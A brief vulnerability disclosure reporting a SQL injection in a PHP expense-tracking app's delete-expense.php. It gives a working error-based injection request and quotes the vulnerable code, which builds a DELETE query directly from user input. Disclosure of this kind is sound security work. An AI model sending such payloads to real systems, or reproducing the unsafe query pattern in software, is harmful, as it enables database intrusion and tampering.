### Exploit Title: daily expenses monitoring app - delete-expense.php sql injection vulnerability

### Date: 2024-08/14

### Exploit Author: Peanut886

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=17356&title=Daily+Expenses+Monitoring+App+Using+PHP+and+MySQL+with+Source+Code#google_vignette

### Version: 1.0

### Tested on: windows10 + phpstudy

# **SQL injection vulnerability in delete-expense.php**
---
## Sample request POC #1

```
http://192.168.253.128/daily-expenses-monitoring-app/endpoint/delete-expense.php?expense=666%27%20AND%20GTID_SUBSET(CONCAT(0x7176787871,(SELECT%20(ELT(3998=3998,1))),0x7162707671),3998)--%20XAOz
```
![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240814-daily%20expenses%20monitoring%20app%20-%20delete-expense.php%20sql%20injection%20vulnerability/delete-expense.php(screen).jpg "daily expenses monitoring app")

## Sqlmap running results #1

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240814-daily%20expenses%20monitoring%20app%20-%20delete-expense.php%20sql%20injection%20vulnerability/delete-expense.php.jpg "daily expenses monitoring app")

## Related Codes delete-expense.php

```php
if (isset($_GET['expense'])) {
    $expense = $_GET['expense'];

    try {

        $query = "DELETE FROM tbl_expense WHERE tbl_expense_id = '$expense'";

        $stmt = $conn->prepare($query);

        $query_execute = $stmt->execute();
```
